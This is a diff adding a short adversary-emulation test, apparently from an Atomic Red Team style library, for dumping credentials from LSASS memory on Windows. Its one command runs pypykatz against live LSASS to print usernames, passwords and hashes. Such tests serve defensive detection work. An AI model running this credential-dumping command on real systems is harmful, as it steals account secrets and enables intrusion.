@@ -1,0 +1,12 @@
+#TechniqueName: OS Credential Dumping: LSASS Memory
+#AtomicTestName: LSASS read with pypykatz
+#Description: Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::&&Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.&&Successful execution of this test will display multiple useranames and passwords/hashes to the screen.&
+#Language: cmd
+
+#get_prereq_commands
+echo "Python 3 must be installed manually"
+
+
+#commands
+pypykatz live lsa
+
